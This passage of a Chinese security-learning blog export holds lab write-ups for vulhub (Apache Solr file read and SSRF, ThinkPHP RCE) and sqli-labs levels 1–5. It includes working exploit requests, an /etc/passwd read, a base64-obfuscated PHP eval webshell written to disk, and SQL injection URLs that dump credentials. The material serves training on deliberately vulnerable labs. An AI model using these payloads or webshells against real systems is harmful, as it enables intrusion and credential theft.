<p> 我们可看到泄露的信息</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081027848.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
      <tags>
        <tag>vulhub漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>vulhub漏洞-Apache_Solr_RemoteStreaming文件读取与SSRF漏洞</title>
    <url>/2021/12/17/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94Apache-Solr-RemoteStreaming%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ESSRF%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Solr 是一个开源的搜索服务器。在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Apache Solr &lt;= 8.8.1</p>
<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>vulhub搭建：<a href="https://github.com/vulhub/vulhub/blob/master/solr/Remote-Streaming-Fileread/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/solr/Remote-Streaming-Fileread/README.zh-cn.md</a></p>
<p>执行如下命令启动solr 8.8.1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>环境启动后，访问<code>http://your-ip:8983</code>即可查看Apache Solr后台。</p>
<span id="more"></span>

<h2 id="复现过程-1"><a href="#复现过程-1" class="headerlink" title="复现过程"></a>复现过程</h2><p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171443322.png" alt="image-20211217144348178"></p>
<p>访问，获取core</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171448280.png" alt="image-20211217144835223"></p>
<p>我们这里core为demo，命令行发送</p>
<p>发送如下数据包，修改数据库demo的配置，开启RemoteStreaming：</p>
<p><code>curl -i -s -k -X  $&#39;POST&#39;  \</code><br>    <code>-H $&#39;Content-Type: application/json&#39;</code> </p>
<p>​    <code>--data-binary $&#39;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125; \</code> </p>
<p>​    <code>$&#39;http://ip:8983/solr/demo/config&#39;</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171450844.png" alt="image-20211217145016779"></p>
<p>读取任意文件</p>
<p><code>curl -i -s -k &#39;http://ip:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#39;</code></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112171455953.png" alt="image-20211217145546857"></p>
]]></content>
  </entry>
  <entry>
    <title>vulhub漏洞—ThinkPHP</title>
    <url>/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94ThinkPHP/</url>
    <content><![CDATA[<p> <img src="https://img-blog.csdnimg.cn/ad3a5fd5b3d444ac802fcc7fc2d11ab1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Xary扫描</strong> </p>
<blockquote>
<p><strong>xray_windows_amd64.exe webscan –url <a href="http://xxx/">http://xxx/</a> –http-output 1.html</strong></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081010196.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 扫描结果</p>
<p><img src="https://img-blog.csdnimg.cn/6625168219c9451288bbd4833321075d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<span id="more"></span>

<p><strong>ThinkPHP漏洞利用</strong></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081010068.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>/index.php?s=captcha</p>
<p>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2ee0db86fc2a46c889dca12cc538cd91.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>shell提权</strong></p>
<p>echo “<?php @eval($_POST[eyeyey936]);?>“  &gt;&gt; ey8.php</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081010192.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>使用蚁剑连接失败了，说明我们的码没有写入成功！</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081010690.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 解决方法：</p>
<p>我们将一句话木马进行base64编码</p>
<p><img src="https://img-blog.csdnimg.cn/8c557b15230648508b80e8f9192703bc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>写入ey7.php文件</p>
<p>|base64 -d 解码</p>
<blockquote>
<p>echo “PD9waHAgQGV2YWwoJF9QT1NUW2V5ZXlleTkzNl0pOz8+”|base64 -d  &gt;&gt; ey7.php</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/1adbcf38ef0641159e84cef59e2d5f61.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 蚁剑连接成功</p>
<p>通过编码成功写入</p>
<p><img src="https://img-blog.csdnimg.cn/7a6c9508d73949528a842ca164ff3282.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 我们查看ey8.php, 可以看到木马写入失败了</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081010938.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们使用冰蝎连接，同样将冰蝎的码进行base64 编解码写入</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081010290.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>提权使用脏牛</p>
<p>过程不在演示了，我也没怎么搞明白~</p>
<p>最终获得了root的密码</p>
]]></content>
      <tags>
        <tag>vulhub漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs闯关详解（保姆级）</title>
    <url>/2021/11/04/sqli-labs%E9%97%AF%E5%85%B3%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BF%9D%E5%A7%86%E7%BA%A7%EF%BC%89/</url>
    <content><![CDATA[<p>在前几关中的index.php文件中指定位置加入两行代码</p>
<p>可以在网页上输出sql查询语句，帮助我们更好的理解学习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/274ff3965c074a61a414b0b02134b43f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></h1><p> <img src="https://img-blog.csdnimg.cn/8f5a8110b9604dcf92b706313bba0326.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/f92403c2696444b1a214645ba34ee185.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 加单引号，查看是否有注入</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27;  </span><br><span class="line">//查看有多少列</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27; order by 3 --+  </span><br><span class="line">// id=-1报错,同时使用联合查找查看那些数据可以回显</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,3 --+  </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//查看当前数据库</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,database() --+  </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/097a80d4dfa743b7800968924fd042ef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看所有数据库</span><br><span class="line">// group_concat()该函数返回带有来自一个组的连接的非NULL值的字符串结果。</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+ </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/eb3f369159ad4d18aab492fced4a0fed.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 单表查询</span><br><span class="line">// table_schema=0x7365637572697479 将数据库名转换为16进制，避免单引号的引入</span><br><span class="line">// 选中库名，点击Hex Encode 转换16进制</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,table_name  from information_schema.tables where table_schema=0x7365637572697479 limit 3,1--+</span><br><span class="line"></span><br><span class="line">// 多表</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/f8ca2eb09f2a4e15a52c70cf81f10275.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看所有列信息</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/a634e75155c642b6bcf0e664074513d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查询账号密码，并用~隔开</span><br><span class="line">// 单个账号查询</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,concat_ws(0x7e,username,password) from security.users limit 0,1--+</span><br><span class="line">// 所有账号查询</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/a79a5127f3c94eadb5800d247950e460.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="-1"><a href="#-1" class="headerlink" title></a></h1><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看是否有注入</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=1‘</span><br><span class="line">// 根据报错可知，多了一个引号</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/3eed67a358ba4766a5fac96a87e3009e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>去掉引号,步骤与less-1一致</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 3 --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,database()--+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(schema_name)  from information_schema.schemata  --+v</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(table_name)  from information_schema.tables where table_schema=0x7365637572697479  --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name)  from information_schema.columns where table_name=0x7573657273 --+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-3/?id=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">观察sql语句发现less-3中的id包裹为 </span><br><span class="line">(&#x27;1&#x27;)</span><br><span class="line">而less-1中的id为</span><br><span class="line">&#x27;1&#x27;</span><br><span class="line">less-2中id的为</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/dcb56750a0e9485481dabccdcab9cbdf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-3/?id=1&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>查看报错信息</p>
<p><img src="https://img-blog.csdnimg.cn/80993639b84142119ae3bc4d2dc7e05f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>分析报错信息，以及id包裹情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-3/?id=1&#x27;) --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/c9239e4ecebc45ccb7c3c82298207d86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>其余步骤与less-1一致</strong></p>
<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a><strong>less-4</strong></h1><p><strong>查看id的包裹情况</strong></p>
<p><img src="https://img-blog.csdnimg.cn/10a58784e21e4ecc9d84f772043799a2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 加上双引号测试，发现可以注入</span><br><span class="line">// 报错多出一个双引号,根据报错信息补全 &quot;) --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/384c00732c144859a71e76895b34a190.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// id后加入 &quot;) 且将之后的代码注释掉 可以正确运行</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-4/?id=2&quot;) --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/de3961d95d264130ba7268e5abcd764c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>其余步骤与less-1一致</strong></p>
<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>bool型盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查看是否有注入</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>基于时间的盲注</p>
<p><img src="https://img-blog.csdnimg.cn/7820d10869d9412684e103b7a84fcdbf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>length 判断数据库名长度 =8  一般先考虑 &lt;8 &gt;8 </p>
<p><img src="https://img-blog.csdnimg.cn/49308da7382049968d2c9d9f1052af41.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// left 匹配数据库名，可以用burpsuite暴力破解</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; and left((select database()),1)=&#x27;a&#x27; --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="1，通过暴力破解获取"><a href="#1，通过暴力破解获取" class="headerlink" title="1，通过暴力破解获取"></a>1，通过暴力破解获取</h2><p><img src="https://img-blog.csdnimg.cn/8cf7d463318f436791a98530fe8e8d05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/bb67046f44404875b5780e977fcd3cc5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://img-blog.csdnimg.cn/f1e1209b8d1441bfa053228f0fff7788.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> start attack ——结果第一位为s，之后的一次破解 </p>
<p><img src="https://img-blog.csdnimg.cn/9663b05a3b63472eb5bb21c9385d6aa1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="2，ascii-值猜解"><a href="#2，ascii-值猜解" class="headerlink" title="2，ascii 值猜解"></a>2，ascii 值猜解</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过二分法拆解得到所有的库</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)) =99 --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
